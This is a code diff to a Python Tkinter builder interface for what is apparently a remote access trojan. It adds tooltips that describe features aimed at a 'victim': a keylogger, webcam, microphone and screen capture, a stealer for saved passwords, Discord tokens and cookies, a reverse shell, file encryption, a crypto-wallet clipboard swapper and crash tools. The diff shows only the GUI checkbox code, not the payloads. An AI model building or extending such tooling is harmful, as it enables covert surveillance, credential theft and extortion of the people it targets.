@@ -6,6 +6,38 @@ import json
 import tkinter.font as tkFont
 from PIL import Image, ImageTk, ImageFont
 
+tooltips = {
+    'keylogr': 'Log every key pressed by victim.',
+    'scrnsht': 'Take screenshot of victim\'s PC',
+    'regstry': '',
+    'f_downl': 'Download any files.',
+    'f_upldg': 'Upload any files.',
+    'f_rmval': 'Remove any files.',
+    'f_explr': 'Explore and browse through victim\'s files/directories.',
+    'f_encrp': 'Encrypt files/directories.',
+    'grabber': 'Grab saved WiFi passwords, Browser-saved passwords, Discord Tokens, Cookies, Browser history.',
+    'mc_live': 'Stream live microphone input using voice channel.',
+    'mc_recc': 'Record microphone input as long as victim has their PC turned on.',
+    'process': 'Browse through processes, kill them, blacklist them (blacklisted process won\'t last more than a second).',
+    'rev_shl': 'Execute remote CMD commands on victim\'s PC.',
+    'webcam_': 'Take images using connected webcam.',
+    'scrnrec': 'Record the victim\'s screen.',
+    'inputbl': 'Block mouse and keyboard input.',
+    'bluesod': 'Blue Screen of Death (kinda crashes victim\'s PC).',
+    'crclipr': 'Swap copied crypto-wallet addresses to your defined ones.',
+    'forkbmb': 'Crash victim\'s PC.',
+    'messger': 'Communicate with your victim with plenty of ways.',
+    'txtspee': 'Whatever you type, victim\'s computer will read it out loud.',
+    'audctrl': 'Control victim\'s audio settings.',
+    'monctrl': 'Turn off victim\'s monitors.',
+    'webbloc': 'Block any website.',
+    'jmpscar': 'Kinda nothing to add here.',
+    'keystrk': 'Type words using your victim\'s keyboard.',
+    'scrnman': 'Manipulate computer\'s graphics and display basically anything.'
+}
+
+
+
 class Builder:
     def __init__(self, master):
         self.master = master
@@ -200,14 +232,14 @@ class Builder:
         self.cb_keylogr = tk.Checkbutton(
             self.canvas,
             selectcolor='#0A0A10',
-            text='log keyboard input',
+            text='keylogger',
             font=('Consolas', 12),
             variable=self.cbvar_keylogr,
             command=self.save_configuration,
             onvalue=True,
             offvalue=False
         )
-        self.cb_keylogr.bind("<Enter>", lambda event: self.show_tooltip(event, 'Hi bruh'))
+        self.cb_keylogr.bind("<Enter>", lambda event: self.show_tooltip(event, tooltips['keylogr']))
         self.cb_keylogr.bind("<Leave>", self.hide_tooltip)
         self.canvas.create_window(x_start, y_delta*1, window=self.cb_keylogr, anchor='w')
 
@@ -222,7 +254,7 @@ class Builder:
             onvalue=True,
             offvalue=False
         )
-        self.cb_scrnsht.bind("<Enter>", lambda event: self.show_tooltip(event, 'Hi bruh'))
+        self.cb_scrnsht.bind("<Enter>", lambda event: self.show_tooltip(event, tooltips['scrnsht']))
         self.cb_scrnsht.bind("<Leave>", self.hide_tooltip)
         self.canvas.create_window(x_start, y_delta*2, window=self.cb_scrnsht, anchor='w')
 
@@ -237,7 +269,7 @@ class Builder:
             onvalue=True,
             offvalue=False
         )
-        self.cb_fdownl.bind("<Enter>", lambda event: self.show_tooltip(event, 'Hi bruh'))
+        self.cb_fdownl.bind("<Enter>", lambda event: self.show_tooltip(event, tooltips['f_downl']))
         self.cb_fdownl.bind("<Leave>", self.hide_tooltip)
         self.canvas.create_window(x_start, y_delta*3, window=self.cb_fdownl, anchor='w')
 
@@ -252,7 +284,7 @@ class Builder:
             onvalue=True,
             offvalue=False
         )
-        self.cb_fupldg.bind("<Enter>", lambda event: self.show_tooltip(event, 'Hi bruh'))
+        self.cb_fupldg.bind("<Enter>", lambda event: self.show_tooltip(event, tooltips['f_upldg']))
         self.cb_fupldg.bind("<Leave>", self.hide_tooltip)
         self.canvas.create_window(x_start, y_delta*4, window=self.cb_fupldg, anchor='w')
 
@@ -267,7 +299,7 @@ class Builder:
             onvalue=True,
             offvalue=False
         )
-        self.cb_frmval.bind("<Enter>", lambda event: self.show_tooltip(event, 'Hi bruh'))
+        self.cb_frmval.bind("<Enter>", lambda event: self.show_tooltip(event, tooltips['f_rmval']))
         self.cb_frmval.bind("<Leave>", self.hide_tooltip)
         self.canvas.create_window(x_start, y_delta*5, window=self.cb_frmval, anchor='w')
 
@@ -282,7 +314,7 @@ class Builder:
             onvalue=True,
             offvalue=False
         )
-        self.cb_fexplr.bind("<Enter>", lambda event: self.show_tooltip(event, 'Hi bruh'))
+        self.cb_fexplr.bind("<Enter>", lambda event: self.show_tooltip(event, tooltips['f_explr']))
         self.cb_fexplr.bind("<Leave>", self.hide_tooltip)
         self.canvas.create_window(x_start, y_delta*6, window=self.cb_fexplr, anchor='w')
 
@@ -297,7 +329,7 @@ class Builder:
             onvalue=True,
             offvalue=False
         )
-        self.cb_fencrp.bind("<Enter>", lambda event: self.show_tooltip(event, 'Hi bruh'))
+        self.cb_fencrp.bind("<Enter>", lambda event: self.show_tooltip(event, tooltips['f_encrp']))
         self.cb_fencrp.bind("<Leave>", self.hide_tooltip)
         self.canvas.create_window(x_start, y_delta*7, window=self.cb_fencrp, anchor='w')
 
@@ -312,7 +344,7 @@ class Builder:
             onvalue=True,
             offvalue=False
         )
-        self.cb_grabber.bind("<Enter>", lambda event: self.show_tooltip(event, 'Hi bruh'))
+        self.cb_grabber.bind("<Enter>", lambda event: self.show_tooltip(event, tooltips['grabber']))
         self.cb_grabber.bind("<Leave>", self.hide_tooltip)
         self.canvas.create_window(x_start, y_delta*8, window=self.cb_grabber, anchor='w')
 
@@ -327,7 +359,7 @@ class Builder:
             onvalue=True,
             offvalue=False
         )
-        self.cb_mclive.bind("<Enter>", lambda event: self.show_tooltip(event, 'Hi bruh'))
+        self.cb_mclive.bind("<Enter>", lambda event: self.show_tooltip(event, tooltips['mc_live']))
         self.cb_mclive.bind("<Leave>", self.hide_tooltip)
         self.canvas.create_window(x_start, y_delta*9, window=self.cb_mclive, anchor='w')
 
@@ -342,7 +374,7 @@ class Builder:
             onvalue=True,
             offvalue=False
         )
-        self.cb_mcrecc.bind("<Enter>", lambda event: self.show_tooltip(event, 'Hi bruh'))
+        self.cb_mcrecc.bind("<Enter>", lambda event: self.show_tooltip(event, tooltips['mc_recc']))
         self.cb_mcrecc.bind("<Leave>", self.hide_tooltip)
         self.canvas.create_window(x_start, y_delta*10, window=self.cb_mcrecc, anchor='w')
 
@@ -357,7 +389,7 @@ class Builder:
             onvalue=True,
             offvalue=False
         )
-        self.cb_process.bind("<Enter>", lambda event: self.show_tooltip(event, 'Hi bruh2'))
+        self.cb_process.bind("<Enter>", lambda event: self.show_tooltip(event, tooltips['process']))
         self.cb_process.bind("<Leave>", self.hide_tooltip)
         self.canvas.create_window(x_start, y_delta*11, window=self.cb_process, anchor='w')
 
@@ -372,7 +404,7 @@ class Builder:
             onvalue=True,
             offvalue=False
         )
-        self.cb_revshl.bind("<Enter>", lambda event: self.show_tooltip(event, 'Hi bruh'))
+        self.cb_revshl.bind("<Enter>", lambda event: self.show_tooltip(event, tooltips['rev_shl']))
         self.cb_revshl.bind("<Leave>", self.hide_tooltip)
         self.canvas.create_window(x_start, y_delta*12, window=self.cb_revshl, anchor='w')
         
